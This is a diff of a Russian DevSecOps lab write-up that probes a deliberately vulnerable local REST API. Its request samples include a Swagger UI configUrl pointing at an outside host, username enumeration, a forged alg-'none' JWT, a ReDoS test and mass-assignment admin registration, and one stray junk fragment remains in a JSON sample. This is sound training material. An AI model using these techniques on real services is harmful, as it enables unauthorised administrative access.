@@ -16,17 +16,14 @@
 
 Для запуска тестового стенда запустим скрипт **run.sh**:
 
-`docker pull ket9/otus-devsecops-owasp-rest`
-
-`docker run -d -p 8080:8080 --name otus-05 ket9/otus-devsecops-owasp-rest:latest`
-
-`while ! nc -z localhost 8080; do`
-
-  `sleep 0.1`
-
-`done`
-
-`curl http://localhost:8080/createdb`
+```bash
+docker pull ket9/otus-devsecops-owasp-rest
+docker run -d -p 8080:8080 --name otus-05 ket9/otus-devsecops-owasp-rest:latest
+while ! nc -z localhost 8080; do
+  sleep 0.1
+done
+curl http://localhost:8080/createdb
+```
 
 
 Этот скрипт скачает образ, запустит его и сформирует базу данных:
@@ -62,7 +59,9 @@
 
 Полученный ответ:
 
-`{"swaggerUi":{"version":"3.52.0","gitRevision":"gee40b00","gitDirty":true,"buildTimestamp":"Mon, 09 Aug 2021 15:13:17 GMT","machine":"ip-XXX-XX-XX-XXX"}}`
+```json
+{"swaggerUi":{"version":"3.52.0","gitRevision":"gee40b00","gitDirty":true,"buildTimestamp":"Mon, 09 Aug 2021 15:13:17 GMT","machine":"ip-XXX-XX-XX-XXX"}}
+```
 
 Попробуем найти уязвимости, связанные с этой версией:
 
@@ -96,36 +95,43 @@ http://localhost:8080/ui/?configUrl=https://jumpy-floor.surge.sh/test.json
 
 Зарегистрируем нашего нового пользователя:
 
-`Запрос:`
-`{"username": "newuser", "password": "password", "email": "newuser@email.com"}`
-`Ответ:`
-`{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}`
+```json
+Запрос:
+{"username": "newuser", "password": "password", "email": "newuser@email.com"}
+Ответ:
+{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
+```
 
 Теперь попробуем авторизоваться с указанием имени несуществующего пользователя:
 
-`Запрос:`
-`{"username": "superuser", "password": "password"}`
-`Ответ:`
-`{"message": "Username does not exist", "status": "fail"}`
+```json
+Запрос:
+{"username": "superuser", "password": "password"}
+Ответ:
+{"message": "Username does not exist", "status": "fail"}
+```
 
 При авторизации без пароля, но с точно существующим именем пользователя:
 
-`Запрос:`
-`{"username": "newuser", "password": "incorrect_password"}`
-`Ответ:`
-`{"message": "Password is not correct for the given username.","status": "fail"}`
+```json
+Запрос:
+{"username": "newuser", "password": "incorrect_password"}
+Ответ:
+{"message": "Password is not correct for the given username.","status": "fail"}
+```
 
 Теперь авторизуемся от нашего пользователя:
 
-`Запрос:`
-`{"username": "newuser", "password": "password"}`
-`}`
-`Ответ:`
-`{`
-    `"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2ODE2NzkyOTEsImlhdCI6MTY4MTY3MzI5MSwic3ViIjoibmV3dXNlciJ9.zYW78Q4agEz2bkwOjf1JnHyohXyeqLsUIam1rWCBzI8",`
-    `"message": "Successfully logged in.",`
-    `"status": "success"`
-`}`
+```json
+Запрос:
+{"username": "newuser", "password": "password"}
+Ответ:
+{
+    "auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2ODE2NzkyOTEsImlhdCI6MTY4MTY3MzI5MSwic3ViIjoibmV3dXNlciJ9.zYW78Q4agEz2bkwOjf1JnHyohXyeqLsUIam1rWCBzI8",
+    "message": "Successfully logged in.",
+    "status": "success"
+}
+```
 
 Попробуем посмотреть, что внутри этого токена:
 
@@ -135,33 +141,41 @@ http://localhost:8080/ui/?configUrl=https://jumpy-floor.surge.sh/test.json
 
 Теперь пробуем выполнить какую-либо операцию, требующую токена, например удаление пользователя по имени, явно требующей прав администратора. В ответ мы получим ошибку:
 
-`{`
-    `"status": "fail",`
-    `"message": "Only Admins may delete users!"`
-`}`
+```json
+{
+    "status": "fail",
+    "message": "Only Admins may delete users!"
+}
+```
 
 Теперь хотелось бы получить каким-либо образом права администратора. Есть два варианта: поднять уровень прав своему аккаунту, или получить доступ к существующему аккаунту администратора через токен авторизации (вариант с уже известным паролем мы не рассматриваем). Попробуем сначала второй вариант.
 
 Проверим, насколько корректно обрабатывается токен в приложении. Мы видим, что используется алгоритм HS256. Попробуем отключить проверку подписи токена, для чего перекодируем его, указав имя admin, и укажем в поле alg значение **none**, что отключает проверку подписи (CVE-2015-9235).
 
 Новый токен будет иметь вид:
-`eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE2ODE2NzI5NTYsImlhdCI6MTY4MTY2Njk1Niwic3ViIjoiYWRtaW4ifQ`
+```
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJleHAiOjE2ODE2NzI5NTYsImlhdCI6MTY4MTY2Njk1Niwic3ViIjoiYWRtaW4ifQ
+```
 
 При выполнении операции получаем ошибку:
 
-`{`
-    `"status": "fail",`
-    `"message": "Invalid token. Please log in again."erver: Werkzeug/1.0.1 Python/3.7erver: Werkzeug/1.0.1 Python/3.7erver: Werkzeug/1.0.1 Python/3.7`
-`}`
+```json
+{
+    "status": "fail",
+    "message": "Invalid token. Please log in again."
+}
+```
 
-Missing security headersЕсли мы добавим в токен пустую подпись, то получим уже более интересную ошибку:
+Если мы добавим в токен пустую подпись, то получим уже более интересную ошибку:
 
-`{`
-    `"detail": "The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.",`
-    `"status": 500,`
-    `"title": "Internal Server Error",`
-    `"type": "about:blank"`
-`}`
+```json
+{
+    "detail": "The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.",
+    "status": 500,
+    "title": "Internal Server Error",
+    "type": "about:blank"
+}
+```
 
 Эта ошибка говорит нам о том, что обработка этой ошибки не была предусмотрена разработчиками приложения, и она была обработана самим фреймворком. То есть если бы авторы фреймворка решили выводить вместе с текстом сообщения какую-либо отладочную информацию (переменные окружения и прочее), то мы бы смогли получить много ценного для нас. Такая же проблема содержится и в запросах, которые должны получать тело запроса при получении пустого значения вместо ожидаемой полезной нагрузки, и в некоторых других местах, например при выполнении запроса типа `http://localhost:8080/users/v1'` 
 
@@ -185,16 +199,20 @@ Missing security headersЕсли мы добавим в токен пустую 
 
 Пробуем разные адреса:
 
-`newadmin_@admin@org1`
-`newadmin@111._comMissing security headersMissing security headers`
-`newadmin`
+```
+newadmin_@admin@org1
+newadmin@111._com
+newadmin
+```
 
 На все попытки получаем одинаковый ответ:
 
-`{`
-    `"status": "fail",`
-    `"message": "Please Provide a valid email address."Bcgjkmpjdfybt `
-`}`
+```json
+{
+    "status": "fail",
+    "message": "Please Provide a valid email address."
+}
+```
 
 Исходя из личного опыта могу предположить, что адрес электронной почты скорее всего проверяется с помощью регулярного выражения, и есть вероятность использования некорректно составленного выражения, которое может привести к тому, что в процессе анализа сервис зависнет (уязвимость regexp denial of service attack). Проверим это, указав в поле email длинную строку:
 
@@ -210,23 +228,27 @@ Missing security headersЕсли мы добавим в токен пустую 
 
 Теперь вернемся к полю admin в параметрах пользователя. Так как не предоставляются методы, с помощью которых это поле может быть изменено, можем предположить, что оно выставляется при регистрации пользователя. Проверим это, выполнив запрос:
 
-`{`
-    `"username": "newuser",`
-    `"password": "password",`
-    `"email": "newuser@email.com",`
-    `"admin": true`
-`}`
+```json
+{
+    "username": "newuser",
+    "password": "password",
+    "email": "newuser@email.com",
+    "admin": true
+}
+```
 
 Регистрация прошла успешно, но флаг не был установлен. При этом нет описания этого флага в [документации](http://localhost:8080/ui/#/users/api_views.users.register_user), значит нам придется его подбирать. Обычно флаг считается установленным, если он имеет значение true, 1, или некоторое строковое значение, типа "yes", или "True"
 
 Методом перебора значения получаем корректный запрос, который нам зарегистрирует нового администратора.
 
-`{`
-    `"username": "newuser",орор`
-    `"password": "password",`
-    `"email": "newuser@email.com",`
-    `"admin": "True"`
-`}`
+```json
+{
+    "username": "newuser",орор
+    "password": "password",
+    "email": "newuser@email.com",
+    "admin": "True"
+}
+```
 
 ![new_admin](./images/new_admin.png)
 
